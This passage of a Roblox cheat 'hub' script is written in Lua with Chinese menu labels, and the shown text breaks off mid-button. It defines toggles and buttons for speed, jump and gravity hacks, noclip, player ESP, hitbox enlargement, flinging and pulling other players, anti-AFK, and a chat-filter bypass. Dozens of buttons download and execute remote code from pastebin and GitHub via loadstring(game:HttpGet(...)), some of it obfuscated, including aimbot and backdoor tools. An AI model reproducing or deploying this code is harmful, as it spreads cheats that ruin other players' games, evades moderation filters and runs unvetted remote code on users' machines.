    if not isTeleporting or not rootPart or not humanoid then
        return
    end

    local currentTime = tick()
    if currentTime - lastTeleportTime < teleportCooldown then
        return
    end
    lastTeleportTime = currentTime

    local moveDirection = humanoid.MoveDirection
    if moveDirection.Magnitude == 0 then
        return
    end

    local teleportVector = moveDirection * teleportDistance

    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist

    local raycastResult = workspace:Raycast(rootPart.Position, teleportVector, raycastParams)

    if raycastResult then
        teleportVector = (raycastResult.Position - rootPart.Position).Unit * teleportDistance
    end

    rootPart.CFrame = rootPart.CFrame + teleportVector
end

function tpWalk:Enabled(enabled)
    isTeleporting = enabled
    if enabled then DisableDefaultMovement() else EnableDefaultMovement() end
end

function tpWalk:GetEnabled()
    return isTeleporting
end

function tpWalk:SetSpeed(speed)
    teleportDistance = (speed or 0.1) / 10
end

function tpWalk:GetSpeed()
    return teleportDistance * 10
end

RunService.Heartbeat:Connect(function()
    if isTeleporting then
        Teleport()
    end
end)

return tpWalk
    end
})
Slider = kTab:Slider({
    Title = "跳跃高度",
    Step = 1,
    Value = {
        Min = 0,
        Max = 1000,
        Default = 50,
    },
    Callback = function(value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
    end
})
Slider = kTab:Slider({
    Title = "重力",
    Step = 1,
    Value = {
        Min = 0,
        Max = 1000,
        Default = 309,
    },
    Callback = function(value)
        game.Workspace.Gravity = value
    end
})
Slider = kTab:Slider({
    Title = "玩家血量",
    Step = 1,
    Value = {
        Min = 0,
        Max = 1000,
        Default = 100,
    },
    Callback = function(value)
        game.Players.LocalPlayer.Character.Humanoid.Health = value
    end
})
kTab:Slider({
    Title = "摄像机视野(FOV)",
    Step = 1,
    Value = {Min = 40, Max = 120, Default = 70},
    Callback = function(v)
        workspace.CurrentCamera.FieldOfView = v
    end
})

kTab:Slider({
    Title = "角色缩放",
    Step = 0.05,
    Value = {Min = 0.5, Max = 3, Default = 1},
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h then h.BodyDepthScale.Value = v h.BodyHeightScale.Value = v h.BodyWidthScale.Value = v h.HeadScale.Value = v end
    end
})

kTab:Slider({
    Title = "角色旋转速度",
    Step = 1,
    Value = {Min = 0, Max = 100},
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h then h.AutoRotate = false h.RootJoint.C0 = h.RootJoint.C0 * CFrame.Angles(0, math.rad(v), 0) end
    end
})

kTab:Slider({
    Title = "下落速度",
    Step = 1,
    Value = {Min = 0, Max = 200, Default = 50},
    Callback = function(v)
        local hrp = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Velocity = Vector3.new(hrp.Velocity.X, -v, hrp.Velocity.Z) end
    end
})

kTab:Slider({
    Title = "环境亮度",
    Step = 0.1,
    Value = {Min = 0, Max = 10, Default = 2},
    Callback = function(v)
        game:GetService("Lighting").Brightness = v
    end
})

kTab:Slider({
    Title = "时间(ClockTime)",
    Step = 0.1,
    Value = {Min = 0, Max = 24, Default = 14},
    Callback = function(v)
        game:GetService("Lighting").ClockTime = v
    end
})

kTab:Slider({
    Title = "雾距离",
    Step = 10,
    Value = {Min = 0, Max = 100000, Default = 100000},
    Callback = function(v)
        game:GetService("Lighting").FogEnd = v
    end
})

kTab:Slider({
    Title = "相机抖动强度",
    Step = 0.1,
    Value = {Min = 0, Max = 5, Default = 0},
    Callback = function(v)
        local cam = workspace.CurrentCamera
        cam.CFrame = cam.CFrame * CFrame.new(math.random() * v / 10, math.random() * v / 10, 0)
    end
})

kTab:Slider({
    Title = "角色透明度",
    Step = 0.05,
    Value = {Min = 0, Max = 1, Default = 0},
    Callback = function(v)
        local char = game.Players.LocalPlayer.Character
        if char then
            for _,p in ipairs(char:GetDescendants()) do
                if p:IsA("BasePart") then p.Transparency = v end
            end
        end
    end
})

kTab:Slider({
    Title = "跳跃冷却缩放",
    Step = 0.05,
    Value = {Min = 0, Max = 1, Default = 0},
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h then h.JumpHeight = h.JumpHeight * (1 + v) end
    end
})

kTab:Slider({
    Title = "相机高度偏移",
    Step = 0.1,
    Value = {Min = -5, Max = 5, Default = 0},
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h then h.CameraOffset = Vector3.new(0, v, 0) end
    end
})
local NightvisionToggle = kTab:Toggle({
    Title = "夜视",
    Flag = "NightvisionToggle",
    Callback = function(v)
        local Lighting = game:GetService("Lighting")
        if v then
            Lighting.Ambient = Color3.new(1, 1, 1)
            Lighting.Brightness = 2
            Lighting.ClockTime = 12
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = false
            Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
        else
            Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)
            Lighting.Brightness = 1
            Lighting.ClockTime = 14
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = true
            Lighting.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
        end
    end
})
local ESPToggle = kTab:Toggle({
    Title = "透视",
    Flag = "ESPToggle",
    Callback = function(v)
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        
        if v then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local highlight = Instance.new("Highlight")
                    highlight.Name = "ESPHighlight"
                    highlight.Adornee = player.Character
                    highlight.FillTransparency = 0.5
                    highlight.OutlineTransparency = 0
                    highlight.Parent = player.Character
                    
                    local gradient = Instance.new("UIGradient")
                    gradient.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0.0, Color3.fromHex("#ff0080")),
                        ColorSequenceKeypoint.new(0.2, Color3.fromHex("#ff4000")),
                        ColorSequenceKeypoint.new(0.4, Color3.fromHex("#ffff00")),
                        ColorSequenceKeypoint.new(0.6, Color3.fromHex("#00ff40")),
                        ColorSequenceKeypoint.new(0.8, Color3.fromHex("#0040ff")),
                        ColorSequenceKeypoint.new(1.0, Color3.fromHex("#4000ff"))
                    })
                    
                    spawn(function()
                        local rotation = 0
                        while highlight.Parent do
                            rotation = (rotation + 2) % 360
                            highlight.FillColor = Color3.fromHSV((rotation / 360), 1, 1)
                            highlight.OutlineColor = Color3.fromHSV(((rotation + 180) / 360) % 1, 1, 1)
                            wait(0.05)
                        end
                    end)
                end
            end
            
            Players.PlayerAdded:Connect(function(player)
                player.CharacterAdded:Connect(function(character)
                    if v then
                        local highlight = Instance.new("Highlight")
                        highlight.Name = "ESPHighlight"
                        highlight.Adornee = character
                        highlight.FillTransparency = 0.5
                        highlight.OutlineTransparency = 0
                        highlight.Parent = character
                        
                        spawn(function()
                            local rotation = 0
                            while highlight.Parent do
                                rotation = (rotation + 2) % 360
                                highlight.FillColor = Color3.fromHSV((rotation / 360), 1, 1)
                                highlight.OutlineColor = Color3.fromHSV(((rotation + 180) / 360) % 1, 1, 1)
                                wait(0.05)
                            end
                        end)
                    end
                end)
            end)
        else
            for _, player in pairs(Players:GetPlayers()) do
                if player.Character then
                    local highlight = player.Character:FindFirstChild("ESPHighlight")
                    if highlight then
                        highlight:Destroy()
                    end
                end
            end
        end
    end
})
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Noclip = false
local NoclipConn

local ToggleElement = kTab:Toggle({
    Title = "穿墙",
    Flag = "NoclipToggle",
    Callback = function(v)
        Noclip = v
        if Noclip then
            NoclipConn = RunService.Stepped:Connect(function()
                local char = LocalPlayer.Character
                if char then
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
        else
            if NoclipConn then
                NoclipConn:Disconnect()
                NoclipConn = nil
            end
        end
    end
})
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local MapESP = false
local Highlights = {}

local function IsCharacterPart(obj)
    local model = obj:FindFirstAncestorOfClass("Model")
    return model and Players:GetPlayerFromCharacter(model)
end

local function EnableMapESP()
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("BasePart") and not IsCharacterPart(v) then
            local h = Instance.new("Highlight")
            h.Adornee = v
            h.FillTransparency = 0.7
            h.OutlineTransparency = 0
            h.Parent = v
            table.insert(Highlights, h)
        end
    end
end

local function DisableMapESP()
    for _, h in ipairs(Highlights) do
        if h then
            h:Destroy()
        end
    end
    table.clear(Highlights)
end

ToggleElement = kTab:Toggle({
    Title = "地图透视",
    Flag = "MapESPToggle",
    Callback = function(v)
        MapESP = v
        if MapESP then
            EnableMapESP()
        else
            DisableMapESP()
        end
    end
})
kTab:Toggle({
    Title = "自动奔跑",
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h then h.WalkSpeed = v and 32 or 16 end
    end
})

kTab:Toggle({
    Title = "禁止跌倒",
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h then h:SetStateEnabled(Enum.HumanoidStateType.FallingDown, not v) end
    end
})

kTab:Toggle({
    Title = "无限呼吸",
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h and h:FindFirstChild("Oxygen") then h.Oxygen.Value = v and math.huge or 100 end
    end
})

kTab:Toggle({
    Title = "自动面对移动方向",
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h then h.AutoRotate = v end
    end
})

kTab:Toggle({
    Title = "相机自由旋转",
    Callback = function(v)
        game:GetService("UserInputService").MouseBehavior = v and Enum.MouseBehavior.LockCenter or Enum.MouseBehavior.Default
    end
})

kTab:Toggle({
    Title = "锁定第一人称",
    Callback = function(v)
        local p = game.Players.LocalPlayer
        p.CameraMode = v and Enum.CameraMode.LockFirstPerson or Enum.CameraMode.Classic
    end
})

kTab:Toggle({
    Title = "自动回血",
    Callback = function(v)
        task.spawn(function()
            while v do
                task.wait(0.5)
                local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                if h then h.Health = math.min(h.MaxHealth, h.Health + 5) end
            end
        end)
    end
})

kTab:Toggle({
    Title = "禁用布娃娃",
    Callback = function(v)
        local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        if h then h:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, not v) end
    end
})

kTab:Toggle({
    Title = "自动跳跃",
    Callback = function(v)
        task.spawn(function()
            while v do
                task.wait(0.3)
                local h = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end
            end
        end)
    end
})

kTab:Toggle({
    Title = "冻结角色",
    Callback = function(v)
        local hrp = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = v end
    end
})
kTab:Button({
    Title = "飞行",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zb9bJsdE"))()
    end
})
kTab:Button({
    Title = "隐身",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/NNv4ghDV"))()
    end
})
kTab:Button({
    Title = "聊天框绘图",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/Zmb2u7Pp"))()
    end
})
kTab:Button({
    Title = "聊天绕过",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AnnaRoblox/AnnaBypasser/refs/heads/main/AnnaBypasser.lua"))()
    end
})
kTab:Button({
    Title = "甩飞所有人",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
    end
})
kTab:Button({
    Title = "吸人",
    Icon = "mouse-pointer-click",
    Callback = function()
                for i,v in pairs(game.Players:GetChildren()) do
            local Target = v.Name
            local R_C = Instance.new("BallSocketConstraint")
            R_C.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
            local hah = Instance.new("Attachment")
            hah.Parent = game.Players[Target].Character.HumanoidRootPart
            local hah2 = Instance.new("Attachment")
            hah2.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
            R_C.Attachment0 = hah
            R_C.Attachment1 = hah2
            R_C.Visible = false
            wait(0.1)
        end
    end
})
kTab:Button({
    Title = "iy指令",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end
})
kTab:Button({
    Title = "坐标显示",
    Icon = "mouse-pointer-click",
    Callback = function()
                local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "CoordinateDisplay"
        screenGui.ResetOnSpawn = false
        screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

        local textLabel = Instance.new("TextLabel")  
        textLabel.Name = "CoordinateLabel"  
        textLabel.Size = UDim2.new(0, 200, 0, 50)  
        textLabel.Position = UDim2.new(1, -210, 0, 10)  
        textLabel.Text = "坐标加载中..."  
        textLabel.TextColor3 = Color3.new(1, 1, 1)  
        textLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)  
        textLabel.BackgroundTransparency = 0.5  
        textLabel.Font = Enum.Font.SourceSansBold  
        textLabel.TextSize = 18  
        textLabel.TextXAlignment = Enum.TextXAlignment.Left  
        textLabel.RichText = true  
        textLabel.Parent = screenGui  

        local humanoidRootPart  
        local function updateCoordinates()  
            humanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")  
            game:GetService("RunService").Heartbeat:Connect(function()  
                if humanoidRootPart then  
                    local pos = humanoidRootPart.Position  
                    textLabel.Text = string.format(  
                        '<font color="rgb(255,102,102)">X: %.2f</font>\n<font color="rgb(102,255,102)">Y: %.2f</font>\n<font color="rgb(173,216,230)">Z: %.2f</font>',  
                        pos.X, pos.Y, pos.Z  
                    )  
                end  
            end)  
        end  

        game.Players.LocalPlayer.CharacterAdded:Connect(function(character)  
            wait()  
            updateCoordinates()  
        end)  

        updateCoordinates()  

        local copyButton = Instance.new("TextButton")  
        copyButton.Size = UDim2.new(0, 100, 0, 30)  
        copyButton.Position = UDim2.new(1, -110, 0, 70)  
        copyButton.Text = "复制坐标"  
        copyButton.TextColor3 = Color3.new(0.75, 0.5, 0.85)  
        copyButton.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)  
        copyButton.BackgroundTransparency = 0.5  
        copyButton.Font = Enum.Font.SourceSansBold  
        copyButton.TextSize = 16  
        copyButton.Parent = screenGui  
        copyButton.MouseButton1Click:Connect(function()  
            setclipboard(tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.Position))  
        end)  

        local consoleButton = Instance.new("TextButton")  
        consoleButton.Size = UDim2.new(0, 100, 0, 30)  
        consoleButton.Position = UDim2.new(1, -110, 0, 110)  
        consoleButton.Text = "控制台"  
        consoleButton.TextColor3 = Color3.new(1, 1, 0.5)  
        consoleButton.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)  
        consoleButton.BackgroundTransparency = 0.5  
        consoleButton.Font = Enum.Font.SourceSansBold  
        consoleButton.TextSize = 16  
        consoleButton.Parent = screenGui  
        consoleButton.MouseButton1Click:Connect(function()  
            game:GetService("VirtualInputManager"):SendKeyEvent(true, "F9", false, game)  
        end)  

        local closeButton = Instance.new("TextButton")  
        closeButton.Size = UDim2.new(0, 100, 0, 30)  
        closeButton.Position = UDim2.new(1, -110, 0, 150)  
        closeButton.Text = "关闭UI"  
        closeButton.TextColor3 = Color3.new(1, 0, 0)  
        closeButton.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)  
        closeButton.BackgroundTransparency = 0.5  
        closeButton.Font = Enum.Font.SourceSansBold  
        closeButton.TextSize = 16  
        closeButton.Parent = screenGui  
        closeButton.MouseButton1Click:Connect(function()  
            screenGui:Destroy()  
        end)  

        local hideButton = Instance.new("TextButton")  
        hideButton.Size = UDim2.new(0, 100, 0, 30)  
        hideButton.Position = UDim2.new(1, -110, 0, 190)  
        hideButton.Text = "隐藏UI"  
        hideButton.TextColor3 = Color3.new(1, 0.5, 0)  
        hideButton.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)  
        hideButton.BackgroundTransparency = 0.5  
        hideButton.Font = Enum.Font.SourceSansBold  
        hideButton.TextSize = 16  
        hideButton.Parent = screenGui  

        local isHidden = false  
        hideButton.MouseButton1Click:Connect(function()  
            isHidden = not isHidden  
            if isHidden then  
                hideButton.Text = "显示UI"  
                textLabel.Visible = false  
                consoleButton.Visible = false  
                copyButton.Visible = false  
                closeButton.Visible = false  
            else  
                hideButton.Text = "隐藏UI"  
                textLabel.Visible = true  
                consoleButton.Visible = true  
                copyButton.Visible = true  
                closeButton.Visible = true  
            end  
        end)  

        local dragging = false  
        local dragInput  
        local dragStart = nil  
        local startPos = nil  

        local function updatePos(input)  
            local delta = input.Position - dragStart  
            hideButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)  
        end  

        hideButton.InputBegan:Connect(function(input)  
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then  
                dragging = true  
                dragStart = input.Position  
                startPos = hideButton.Position  
                input.Changed:Connect(function()  
                    if input.UserInputState == Enum.UserInputState.End then  
                        dragging = false  
                    end  
                end)  
            end  
        end)  

        hideButton.InputChanged:Connect(function(input)  
            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then  
                dragInput = input  
            end  
        end)  

        game:GetService("UserInputService").InputChanged:Connect(function(input)  
            if dragging and input == dragInput then  
                updatePos(input)  
            end  
        end)  
    end
})
kTab:Button({
    Title = "全图火焰",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fire-all-12970"))()
    end
})
kTab:Button({
    Title = "铁拳",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))()
    end
})
kTab:Button({
    Title = "滚球",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/8U2YyZQE"))()
    end
})
kTab:Button({
    Title = "踏空行走",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Float"))()
    end
})
kTab:Button({
    Title = "指定玩家甩飞",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Key%20System"))()
    end
})
kTab:Button({
    Title = "免费动作",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Free-emote/refs/heads/main/Delta%20mad%20stuffs"))()
    end
})
kTab:Button({
    Title = "爬墙",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
    end
})
kTab:Button({
    Title = "反挂机",
    Icon = "mouse-pointer-click",
    Callback = function()
                game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "反挂机---晓月lol"; Text ="开启成功"; Duration = 4; })

        local vu = game:GetService("VirtualUser")  

        game:GetService("Players").LocalPlayer.Idled:connect(function()  

            vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)  

            wait(1)  

            vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)  

        end)  
    end
})
kTab:Button({
    Title = "控制玩家",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0%20(1).txt"))()        
    end
})
kTab:Button({
    Title = "无限跳",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
    end
})
kTab:Button({
    Title = "ak47",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ak47", true))()
    end
})
kTab:Button({
    Title = "后门脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
    end
})
kTab:Button({
    Title = "coolgui",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
    end
})
kTab:Button({
    Title = "扩大玩家碰撞箱(仅fps游戏)",
    Icon = "mouse-pointer-click",
    Callback = function()
        _G.HeadSize = 25
        _G.Disabled = true

        game:GetService('RunService').RenderStepped:connect(function()  
            if _G.Disabled then  
                for i,v in next, game:GetService('Players'):GetPlayers() do  
                    if v.Name ~= game:GetService('Players').LocalPlayer.Name then  
                        pcall(function()  
                            v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)  
                            v.Character.HumanoidRootPart.Transparency = 0.7  
                            v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")  
                            v.Character.HumanoidRootPart.Material = "Neon"  
                            v.Character.HumanoidRootPart.CanCollide = false  
                        end)  
                    end  
                end  
            end  
        end)  
    end
})
kTab:Button({
    Title = "Rtx光影",
    Icon = "mouse-pointer-click",
    Callback = function()
        local Lighting = game:GetService("Lighting")
        local Players = game:GetService("Players")
        local UIS = game:GetService("UserInputService")

        for _, v in ipairs(Lighting:GetChildren()) do  
            if v:IsA("PostEffect") then  
                v:Destroy()  
            end  
        end  

        local function addBloom()  
            local bloom = Instance.new("BloomEffect")  
            bloom.Intensity = 1.5  
            bloom.Threshold = 0.8  
            bloom.Size = 64  
            bloom.Parent = Lighting  
        end  

        local function applyDay()  
            Lighting.ClockTime = 14  
            Lighting.Brightness = 3  
            Lighting.Ambient = Color3.fromRGB(170, 170, 170)  
            Lighting.OutdoorAmbient = Color3.fromRGB(210, 210, 210)  
            Lighting.FogStart = 300  
            Lighting.FogEnd = 1000  
            Lighting.FogColor = Color3.fromRGB(255, 245, 230)  
            addBloom()  
            print("RTX Day Mode (Strong Bloom) Applied.")  
        end  

        local function applyNight()  
            Lighting.ClockTime = 0  
            Lighting.Brightness = 2  
            Lighting.Ambient = Color3.fromRGB(50, 50, 80)  
            Lighting.OutdoorAmbient = Color3.fromRGB(30, 30, 60)  
            Lighting.FogStart = 200  
            Lighting.FogEnd = 800  
            Lighting.FogColor = Color3.fromRGB(15, 15, 30)  
            addBloom()  
            print("RTX Night Mode (Strong Bloom) Applied.")  
        end  

        local isDay = true  
        local function toggleMode()  
            for _, v in ipairs(Lighting:GetChildren()) do  
                if v:IsA("PostEffect") then  
                    v:Destroy()  
                end  
            end  

            if isDay then  
                applyNight()  
            else  
                applyDay()  
            end  
            isDay = not isDay  
        end  

        UIS.InputBegan:Connect(function(input, gp)  
            if not gp and input.KeyCode == Enum.KeyCode.L then  
                toggleMode()  
            end  
        end)  

        local function createMobileButton()  
            local player = Players.LocalPlayer  
            local playerGui = player:WaitForChild("PlayerGui")  

            local gui = Instance.new("ScreenGui")  
            gui.Name = "RTX_Toggle_UI"  
            gui.ResetOnSpawn = false  
            gui.Parent = playerGui  

            local button = Instance.new("TextButton")  
            button.Size = UDim2.new(0, 140, 0, 40)  
            button.Position = UDim2.new(0.02, 0, 0.9, 0)  
            button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)  
            button.TextColor3 = Color3.new(1, 1, 1)  
            button.Font = Enum.Font.GothamBold  
            button.TextSize = 16  
            button.Text = "Toggle RTX"  
            button.Parent = gui  

            button.MouseButton1Click:Connect(toggleMode)  
        end  

        applyDay()  
        createMobileButton()  
    end
})
kTab:Button({
    Title = "来财",
    Icon = "mouse-pointer-click",
    Callback = function()
        local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://138071144850653"
    sound.Parent = game.Workspace
    sound:Play()
    end
})
kTab:Button({
    Title = "动态模糊",
    Icon = "mouse-pointer-click",
    Callback = function()
        local camera = workspace.CurrentCamera
        local blurAmount = 10
        local blurAmplifier = 5
        local lastVector = camera.CFrame.LookVector

        local motionBlur = Instance.new("BlurEffect", camera)

        local runService = game:GetService("RunService")

        workspace.Changed:Connect(function(property)
            if property == "CurrentCamera" then
                print("Changed")
                local camera = workspace.CurrentCamera
                if motionBlur and motionBlur.Parent then
                    motionBlur.Parent = camera
                else
                    motionBlur = Instance.new("BlurEffect", camera)
                end
            end
        end)

        runService.Heartbeat:Connect(function()
            if not motionBlur or motionBlur.Parent == nil then
                motionBlur = Instance.new("BlurEffect", camera)
            end

            local magnitude = (camera.CFrame.LookVector - lastVector).magnitude
            motionBlur.Size = math.abs(magnitude) * blurAmount * blurAmplifier / 2
            lastVector = camera.CFrame.LookVector
        end)
    end
})
kTab:Button({
    Title = "通用子弹追踪",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/%E4%BA%91UI.txt"))()
    end
})
kTab:Button({
    Title = "无敌少侠飞行",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"))()
    end
})
kTab:Button({
    Title = "索尼克动作",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/271G7Fy4/raw"))()
    end
})
kTab:Button({
    Title = "超人飞行",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://github.com/Sinister-Scripts/Roblox-Exploits/raw/refs/heads/main/FE-Animated-Mobile-Fly"))()
    end
})
kTab:Button({
    Title = "攻击npc脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Fe-ProjectR/FE-Forsaken/refs/heads/main/C00LKIDD%20forsaken%20FINALE.txt"))()
    end
})
kTab:Button({
    Title = "蜗牛脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/1PvSFyZ4"))()
    end
})
kTab:Button({
    Title = "监控玩家(仅供娱乐)",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShutUpJamesTheLoserAlt/hatspin/refs/heads/main/hat"))()
    end
})
kTab:Button({
    Title = "音乐轰炸",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/trYRRWSr"))()
    end
})
kTab:Button({
    Title = "黑客聊天v2",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/4RhNhaaM"))()
    end
})
kTab:Button({
    Title = "自定义碰撞力",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/17867876100/refs/heads/main/%E6%9D%80.txt"))()
    end
})
kTab:Button({
    Title = "当别人的宠物",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty40.lua"))()
    end
})
kTab:Button({
    Title = "快影(f键启动)",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/idbiRMZG"))()
    end
})
kTab:Button({
    Title = "r15动作",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Rootleak/roblox/main/main.lua"))()
    end
})
kTab:Button({
    Title = "解锁所有商城动画",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BS58dL/BS/refs/heads/main/解锁所有商城动画.txt"))()
    end
})
kTab:Button({
    Title = "伪跳墙",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScpGuest666/Random-Roblox-script/main/Roblox%20WallHop%20V4%20script"))()
    end
})
kTab:Button({
    Title = "阿尔宙斯自瞄",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/FhSwvKVR"))()
    end
})
kTab:Button({
    Title = "建筑工具",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/f3x.lua"))()
    end
})
kTab:Button({
    Title = "fe爱的抱抱",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/Animations/refs/heads/main/Front%20and%20Back%20Hug%20Tool"))()
    end
})
kTab:Button({
    Title = "显示角色数据",
